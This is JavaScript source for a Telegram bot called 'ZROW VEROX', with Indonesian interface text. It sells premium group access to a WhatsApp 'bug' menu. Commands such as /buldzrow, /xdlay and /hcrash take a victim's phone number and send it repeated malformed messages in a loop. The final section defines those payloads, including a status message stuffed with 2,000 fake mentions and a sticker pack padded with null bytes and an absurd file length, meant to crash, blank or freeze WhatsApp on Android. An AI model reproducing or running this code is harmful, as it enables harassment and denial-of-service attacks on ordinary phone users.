    targetId = String(targetId);

    delAdmin(targetId);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝘼𝙙𝙢𝙞𝙣
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚
\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("DEL ADMIN ERROR:", err);
    ctx.reply("❌ Error deladmin");
  }
});

// ------ ( Command Add Premium ) ------ //
bot.command("addprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;
    let days;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
      days = parseInt(args[0]);
    } 
    // mode ID manual
    else {
      targetId = args[0];
      days = parseInt(args[1]);
    }

    if (!targetId || !days) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /addprem 30\n" +
        "ID: /addprem 123456789 30"
      );
    }

    const expired = Date.now() + days * 86400000;

    premiumDB[targetId] = expired;
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙖𝙢𝙗𝙖𝙝𝙠𝙖𝙣 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙈𝙖𝙨𝙖 𝘼𝙠𝙩𝙞𝙛 : ${days} 
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.log("ADD PREMIUM ERROR:", err);
    ctx.reply("❌ Error addpremium");
  }
});

// ------ ( Command Del Premium ) ------ //
bot.command("delprem", async (ctx) => {
  try {
    if (!isOwnerOrAdmin(ctx.from.id)) {
      return ctx.reply("❌ Hanya Owner & Admin yang bisa mengakses cmd");
    }

    const args = ctx.message.text.split(" ").slice(1);

    let targetId;

    // mode reply
    if (ctx.message.reply_to_message) {
      targetId = ctx.message.reply_to_message.from.id;
    } 
    // mode ID
    else {
      targetId = args[0];
    }

    if (!targetId) {
      return ctx.reply(
        "❌ Format salah Contoh :\n" +
        "Reply: /delprem\n" +
        "ID: /delprem 123456789"
      );
    }

    if (!premiumDB[targetId]) {
      return ctx.reply("❌ User bukan premium");
    }

    delete premiumDB[targetId];
    savePremium(premiumDB);

    return ctx.reply( `\`\`\`JS
✘ 𝘽𝙚𝙧𝙝𝙖𝙨𝙞𝙡 𝙈𝙚𝙣𝙜𝙝𝙖𝙥𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
      { parse_mode: "HTML" }
    );

  } catch (err) {
    console.log("DEL PREMIUM ERROR:", err);
    ctx.reply("❌ Error delpremium");
  }
});

// ------ ( Command Cek Premium ) ------ //
bot.command("checkprem", async (ctx) => {
  const target = ctx.message.reply_to_message
    ? ctx.message.reply_to_message.from
    : ctx.from;

  if (!isPremium(target.id)) {
    return ctx.reply("❌ User bukan premium");
  }

  const expired = getPremiumExpire(target.id);

  return ctx.reply( `\`\`\`JS
✘ 𝘾𝙝𝙚𝙘𝙠 𝙎𝙩𝙖𝙩𝙪𝙨 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 
⸙ 𝙐𝙨𝙚𝙧 𝙏𝙖𝙧𝙜𝙚𝙩 : ${targetId}
⸙ 𝙀𝙭𝙥𝙞𝙧𝙚𝙙 : ${formatDate(expired)}
⸙ 𝙎𝙩𝙖𝙩𝙪𝙨 : 𝙏𝙚𝙧𝙨𝙞𝙢𝙥𝙖𝙣 𝘿𝙞 𝘿𝙖𝙩𝙖𝙗𝙖𝙨𝙚\`\`\``,
    { parse_mode: "HTML" }
  );
});

// ------ ( Thumbnail Foto Menu ) ------ //
const FotoUtama = "https://gangalink.vercel.app/i/bs8mqlt9.jpg";

let groupOnly = true // default aktif (langsung block private)

// =================
// Middleware (AUTO FILTER)
// =================
bot.use((ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  const isPrivate = ctx.chat.type === 'private'
  const cmd = text.split(' ')[0].replace('/', '').toLowerCase()

  // =========================
  // 🔒 GROUP ONLY (NO BYPASS)
  // =========================
  if (groupOnly && isPrivate) {
    return ctx.reply('❌ Mode Group Only aktif\nGunakan command di group')
  }

  // =========================
  // OWNER CHECK (HANYA UNTUK CONTROL)
  // =========================
  const userId = String(ctx.from.id)
  const isOwner = ID_TELEGRAM || isAdmin(userId);

  if (cmd === 'grouponly' && !isOwner) {
    return ctx.reply('❌ Hanya Owner yang bisa mengakses cmd')
  }

  return next()
})

let forceChannel = null
let channelOn = false

// =================
// Helper
// =================
function isOwner(ctx) {
  return ID_TELEGRAM || isAdmin(userId);
}

// =================
// Middleware (AUTO CEK JOIN)
// =================
bot.use(async (ctx, next) => {
  if (!ctx.message || !ctx.message.text) return next()

  const text = ctx.message.text
  if (!text.startsWith('/')) return next()

  // Skip kalau belum aktif / belum set channel
  if (!channelOn || !forceChannel) return next()

  try {
    const member = await ctx.telegram.getChatMember(forceChannel, ctx.from.id)

    const status = member.status
    if (status === 'left' || status === 'kicked') {
      return ctx.reply(
        `❌ Anda harus join channel dulu!\n\n👉 ${forceChannel}`
      )
    }

  } catch (e) {
    return ctx.reply('⚠️ Bot tidak bisa cek channel (pastikan bot admin)')
  }

  return next()
})

// --- html escape biar aman ---
function escapeHtml(s = "") {
  return String(s)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

// --- middleware: premium group gate (pakai buat command premium) ---
const premGroupOnly = () => async (ctx, next) => {
  const chatType = ctx.chat?.type;
  if (chatType === "private") {
    return ctx.reply("❌ Command ini hanya bisa dipakai di grup premium.");
  }
  if (!isPremGroup(ctx.chat.id)) {
    const title = ctx.chat?.title || "Group ini";
    return ctx.reply(`❌ ☇ Grup <b>${escapeHtml(title)}</b> belum terdaftar sebagai <b>GRUP PREMIUM</b>.`, {
      parse_mode: "HTML",
    });
  }
  return next();
};

//------------------(PREMIUM GROUP)--------------------//
// DB file auto dibuat
const PREM_GROUP_DB = path.join(__dirname, "premgb.json");

// --- helpers db ---
function loadPremGroups() {
  try {
    if (!fs.existsSync(PREM_GROUP_DB)) {
      fs.writeFileSync(PREM_GROUP_DB, JSON.stringify({ groups: [] }, null, 2));
    }
    const raw = fs.readFileSync(PREM_GROUP_DB, "utf8");
    const json = JSON.parse(raw);
    if (!json || !Array.isArray(json.groups)) return { groups: [] };
    return json;
  } catch {
    return { groups: [] };
  }
}

function savePremGroups(db) {
  fs.writeFileSync(PREM_GROUP_DB, JSON.stringify(db, null, 2));
}

function isPremGroup(chatId) {
  const db = loadPremGroups();
  return db.groups.includes(Number(chatId));
}

function addPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  if (!db.groups.includes(id)) db.groups.push(id);
  savePremGroups(db);
  return true;
}

function delPremGroup(chatId) {
  const db = loadPremGroups();
  const id = Number(chatId);
  db.groups = db.groups.filter((g) => g !== id);
  savePremGroups(db);
  return true;
}

function saveCooldown(data) {
  fs.writeFileSync(COOLDOWN_FILE, JSON.stringify(data, null, 2));
}

// --- middleware owner only ---
const ownerOnly = () => async (ctx, next) => {
  if (!ctx.from) return;

  if (String(ctx.from.id) !== String(ID_TELEGRAM)) {
    return ctx.reply("❌ Khusus owner.", {
      reply_to_message_id: ctx.message?.message_id
    });
  }

  return next();
};

// ------ ( Menu Utama + Button Disko ) ------ //
const styles = ["Primary", "Success", "Danger"];
let styleIndex = 0;
let menuAnimation = null;

function getAnimatedMainKeyboard() {
    const style = styles[styleIndex];

    styleIndex++;
    if (styleIndex >= styles.length) styleIndex = 0;

    return [
        [
            { text: "! Murbug", callback_data: "/bug_menu", style },
            { text: "! Setting", callback_data: "/owner_menu", style }
        ],
        [
            { text: "🌐 Saluran", url: "t.me/AboutXyenz", style }
        ]
    ];
}

function stopMenuAnimation() {
    if (menuAnimation) {
        clearInterval(menuAnimation);
        menuAnimation = null;
    }
}

// ------ ( Menu Utama ) ------ //
bot.start(async (ctx) => {
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const runTime = runtime(process.uptime());
    const menuMessage = `\`\`\`JS
 ( ⌭ ) – ZROW VEROX 
     
 ⬡═―—⊱ ⎧ Profil User ⎭ ⊰―—═⬡
▢ Creator : @xyenzzx
▢ Version : 4.0 - Fixed
▢ User : @${ctx.from.username || "Tidak Ada"}
  
 ⬡═―—⊱ ⎧ bot status ⎭ ⊰―—═⬡
▢ Premium Stats : ${premiumStatus}
▢ Run Time Stats : ${runTime}

Tap button below to continue →
\`\`\``;

    try {
        stopMenuAnimation();

        const sentMsg = await ctx.replyWithPhoto(FotoUtama, {
            caption: menuMessage,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: getAnimatedMainKeyboard()
            }
        });

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    sentMsg.message_id,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);
    } catch (error) {
        console.error("Error saat mengirim menu utama:", error);
    }
});

// ------ ( Callback Menu Utama ) ------ //
bot.action("/start", async (ctx) => {
    const premiumStatus = getPremiumStatus(ctx.from.id);
    const runTime = runtime(process.uptime());
    const menuMessage = `\`\`\`JS
 ( ⌭ ) – ZROW VEROX 
     
 ⬡═―—⊱ ⎧ Profil User ⎭ ⊰―—═⬡
▢ Creator : @xyenzzx
▢ Version : 4.0 - Fixed
▢ User : @${ctx.from.username || "Tidak Ada"}
  
 ⬡═―—⊱ ⎧ bot status ⎭ ⊰―—═⬡
▢ Premium Stats : ${premiumStatus}
▢ Run Time Stats : ${runTime}

Tap button below to continue →
\`\`\``;

    try {
        stopMenuAnimation();

        await ctx.editMessageMedia(
            {
                type: "photo",
                media: FotoUtama,
                caption: menuMessage,
                parse_mode: "Markdown"
            },
            {
                reply_markup: {
                    inline_keyboard: getAnimatedMainKeyboard()
                }
            }
        );

        const messageId = ctx.callbackQuery.message.message_id;

        menuAnimation = setInterval(async () => {
            try {
                await ctx.telegram.editMessageReplyMarkup(
                    ctx.chat.id,
                    messageId,
                    undefined,
                    {
                        inline_keyboard: getAnimatedMainKeyboard()
                    }
                );
            } catch (e) {}
        }, 2500);

        await ctx.answerCbQuery();
    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error saat mengirim menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Bug Menu ) ------ //
bot.action('/bug_menu', async (ctx) => {
    stopMenuAnimation(); 
    const bug_menuMenu = `\`\`\`JS
 ( ⌭ ) – ZROW VEROX 
     
 ⬡═―—⊱ ⎧ Profil User ⎭ ⊰―—═⬡
▢ Creator : @xyenzzx
▢ Version : 4.0 - Fixed
▢ User : @${ctx.from.username || "Tidak Ada"}

 ⬡═―—⊱ ⎧ BUGS COMMAND⎭ ⊰―—═⬡
▢ /buldzrow - buldozer
▢ /xdlay - delay 
▢ /dgerd - Blank Android 
▢ /forxs - FC click  
▢ /xblanks - Blank ui  
▢ /hcrash - crash notif  
Tap button below to continue →
\`\`\``;

    const keyboard = [
        [
            { text: "! Back", callback_data: "/start", style: "Danger" },
        ]
    ];

    try {
        await ctx.editMessageCaption(bug_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di bug_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Bot Action Owner Menu ) ------ //
bot.action('/owner_menu', async (ctx) => {
    stopMenuAnimation(); 
    const owner_menuMenu = `\`\`\`JS
 ( ⌭ ) – ZROW VEROX 
     
 ⬡═―—⊱ ⎧ Profil User ⎭ ⊰―—═⬡
▢ Creator : @xyenzzx
▢ Version : 4.0 - Fixed
▢ User : @${ctx.from.username || "Tidak Ada"}
  
 ⬡═―—⊱ ⎧ Cmd Setting ⎭ ⊰―—═⬡
▢ /addprem - Add Premium 
▢ /delprem - Del Premium 
▢ /addadmin - Add Admin
▢ /deladmin - Del Admin
▢ /addbot - Add Sender 
▢ /killsesi - Hapus Sender
▢ /grouponly - Group Mode
▢ /setchannel - Set Channel 
▢ /channel - On/Off Fitur
▢ /addpremgrup - Add Group Premium
▢ /delpremgrup - Delete Premium Group 
▢ /cekpremgrup - List Premium Group


Tap button below to continue →
\`\`\``;

    const keyboard = [
        [
            { text: "! Back", callback_data: "/start", style: "Danger" },
        ]
    ];

    try {
        await ctx.editMessageCaption(owner_menuMenu, {
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });

        await ctx.answerCbQuery();

    } catch (error) {
        const desc =
            error?.response?.description ||
            error?.description ||
            error?.message ||
            "";

        if (
            error?.response?.error_code === 400 &&
            (
                desc.includes("message is not modified") ||
                desc.includes("メッセージは変更されませんでした")
            )
        ) {
            await ctx.answerCbQuery();
        } else {
            console.error("Error di owner_menu:", error);
            await ctx.answerCbQuery("⚠️ Terjadi kesalahan, coba lagi");
        }
    }
});

// ------ ( Case Bug Menu ) ------ //
bot.command("buldzrow", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /buldzrow 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerOnly && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 20;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Buldozer Invisible 
ıllı Status : Processing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await BulldozerInvisble(sock, target);
    await sleep(1600);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined,
          `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Buldozer Invisible 
ıllı Status : Sending... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Buldozer Invisible 
ıllı Status : Executing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
        ]]
      }
    }
  );
});

bot.command("xdlay", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdlay 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerOnly && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 20;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Delay Invisible 
ıllı Status : Processing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await HardFix(sock, target);
    await sleep(1600);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined,
          `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Delay Invisible 
ıllı Status : Sending... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Delay Invisible 
ıllı Status : Executing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
        ]]
      }
    }
  );
});

bot.command("hcrash", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /hcrash 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerOnly && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 5;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Crash Notification Android 
ıllı Status : Processing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await BarzzTamvan(sock, target);
    await sleep(1600);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined,
          `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Crash Notification Android 
ıllı Status : Sending... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Crash Notification Android 
ıllı Status : Executing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
        ]]
      }
    }
  );
});

bot.command("xblanks", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xblanks 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerOnly && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 5;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Blank Android 
ıllı Status : Processing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await Xyen(sock, target);
    await sleep(1600);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined,
          `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Blank Android 
ıllı Status : Sending... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Blank Android 
ıllı Status : Executing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
        ]]
      }
    }
  );
});

bot.command("forxs", premGroupOnly(), checkWhatsAppConnection, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /forxs 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerOnly && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("❌ ☇ Grup ini belum terdaftar sebagai GRUP PREMIUM.");
  }

  const total = 5;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, FotoUtama, {
    caption: `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Forceclose click Android 
ıllı Status : Processing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < total; i++) {
    await FcClickByMia(sock, target);
    await sleep(1600);

    // update tiap 5 step biar gak rate limit
    if (i % 5 === 0 || i === total - 1) {
      const percent = Math.floor(((i + 1) / total) * 100);

      try {
        await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined,
          `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Forceclose click Android 
ıllı Status : Sending... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [[
                { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "primary" }
              ]]
            }
          }
        );
      } catch {}
    }
  }

  // FINAL SUCCESS
  await ctx.telegram.editMessageCaption(
    ctx.chat.id,
    processMessageId,
    undefined,
    `
<blockquote>𝗭𝗥𝗢𝗪 𝗩𝗘𝗥𝗢𝗫</blockquote>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⊂⊃ Target : ${q}
❀ Type : Forceclose click Android 
ıllı Status : Executing... 
━━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[
          { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "danger" }
        ]]
      }
    }
  );
});

// ------ ( Awal Of Function Bug) ------ //
async function BulldozerInvisble(sock, target) {
  let msg = {
    groupStatusMessageV2: {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: Buffer.from([
          226, 213, 217, 102, 205, 126, 232, 145,
          0, 70, 137, 73, 190, 145, 0, 44,
          165, 102, 153, 233, 111, 114, 69, 10,
          55, 61, 186, 131, 245, 153, 93, 211
        ]),
        fileLength: 432722,
        seconds: 26,
        ptt: false,
        mediaKey: Buffer.from([
          182, 141, 235, 167, 91, 254, 75, 254,
          190, 229, 25, 16, 78, 48, 98, 117,
          42, 71, 65, 199, 10, 164, 16, 57,
          189, 229, 54, 93, 69, 6, 212, 145
        ]),
        fileEncSha256: Buffer.from([
          29, 27, 247, 158, 114, 50, 140, 73,
          40, 108, 77, 206, 2, 12, 84, 131,
          54, 42, 63, 11, 46, 208, 136, 131,
          224, 87, 18, 220, 254, 211, 83, 153
        ]),
        directPath: "/v/t62.7114-24/25481244_734951922191686_4223583314642350832_n.enc?ccb=11-4&oh=01_Q5Aa1QGQy_f1uJ_F_OGMAZfkqNRAlPKHPlkyZTURFZsVwmrjjw&oe=683D77AE&_nc_sid=5e03e0",
        mediaKeyTimestamp: 1746275400,
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
          isSampled: true,
          participant: target,
          remoteJid: "status@broadcast",
          forwardingScore: 9741,
          isForwarded: true
        }
      }
    }
  };

  await sock.relayMessage(target, msg, {
    participant: { jid: target }
  });
}

async function HardFix(sock, target) {
  const crash = "\u0000".repeat(9000);
  const Zl = "999999999999";
  const startTime = Date.now();
  const duration = 1 * 900 * 1000;
  const x = "atr_sticker_pack";
  const zun = 99999999999999; 

  let msg = {
    groupStatusMessageV2: {
      stickerPackMessage: {
        stickerPackId: x,
        name: "ATHERIA - STICKER PACK",
        publisher: "ATHERIA",
        fileLength: zun, 
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        mimetype: "image/webp",
